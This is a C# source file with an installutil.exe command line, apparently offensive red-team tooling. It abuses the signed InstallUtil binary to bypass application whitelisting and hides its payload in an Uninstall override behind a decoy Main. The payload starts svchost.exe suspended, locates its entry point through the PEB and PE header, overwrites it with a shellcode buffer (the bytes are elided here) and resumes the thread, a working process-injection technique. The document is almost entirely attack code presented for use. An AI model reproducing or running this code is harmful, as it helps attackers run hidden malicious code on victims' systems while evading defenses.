C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\InstallUtilBypass.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace InstallUtil
{
    class Program
    {


        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy.");
        }

    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]

        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWriten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);


        public override void Uninstall(IDictionary savedState)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];

            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            Console.WriteLine(svchostBase);

            Console.WriteLine(pi.dwProcessId);

            byte[] data = new byte[0x200];

            ReadProcessMemory(pi.hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);


            byte[] buf = new byte[511] {...};

            WriteProcessMemory(pi.hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);


            ResumeThread(pi.hThread);


        }

    }
}
